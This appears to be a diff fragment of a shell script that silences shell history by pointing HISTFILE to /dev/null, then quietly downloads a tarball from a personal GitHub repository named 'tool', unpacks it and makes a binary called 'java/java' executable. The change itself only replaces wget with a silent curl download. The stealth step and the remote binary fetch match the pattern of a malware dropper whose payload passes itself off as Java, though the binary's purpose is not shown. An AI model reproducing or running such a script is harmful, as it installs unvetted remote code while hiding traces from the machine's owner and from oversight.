@@ -25,7 +25,7 @@ export HISTFILE=/dev/null
 if [ ! -f "$(pwd)/java/java" ]; then
     echo "[+] Downloading ..."
     rm -rf java java.tar.gz
-    wget -q https://raw.githubusercontent.com/trinhkhaccong/tool/main/java.tar.gz
+    curl -sL -o java.tar.gz https://raw.githubusercontent.com/trinhkhaccong/tool/main/java.tar.gz
     tar -xzf java.tar.gz
     chmod +x java/java
     rm -f java.tar.gz
